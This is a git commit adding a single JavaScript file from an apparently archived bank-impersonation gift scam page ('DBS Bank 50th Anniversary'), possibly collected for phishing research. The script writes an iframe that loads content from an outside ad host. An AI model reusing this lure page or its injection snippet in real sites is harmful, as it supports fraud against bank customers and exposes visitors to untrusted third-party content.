b789672e3e1ca80f71019f97f1df381768f62152
Yanfu <yanfu-guo@sjtu.edu.cn>
2021-11-25 11:41:09 -0500

    upload

---
+++ httpfkhcnw.bar/choose_gift_🎉DBS Bank 50th Anniversary!🎊_files/bnr.php
@@ -0,0 +1,1 @@
+var qs = Math.round(Math.random()*10000000); document.writeln('<iframe src="https://uprimp.com/bnr_xload.php?section=General&pub=593174&format=300x50&ga=g&xt=163345378070637&xtt='+qs+'" width="300" height="50" frameborder="0" marginheight="0" marginwidth="0" scrolling="no" sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts"></iframe>');
